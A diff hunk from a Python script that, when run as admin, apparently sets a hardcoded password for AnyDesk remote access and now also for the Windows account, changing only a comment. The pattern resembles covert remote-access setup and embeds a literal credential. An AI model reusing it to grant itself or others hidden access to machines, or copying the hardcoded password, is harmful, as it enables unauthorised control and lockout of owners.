@@ -75,7 +75,7 @@ def main():
         if is_admin():
             anydesk_id = get_anydesk_id()
             if anydesk_id:
-                password = "AfEW76c06PHbyUbO1MsS4Xn" # Change the password for anydesk here     
+                password = "AfEW76c06PHbyUbO1MsS4Xn" # Change the password for both anydesk and windows password
 
                 folder_name = socket.gethostname()
                 
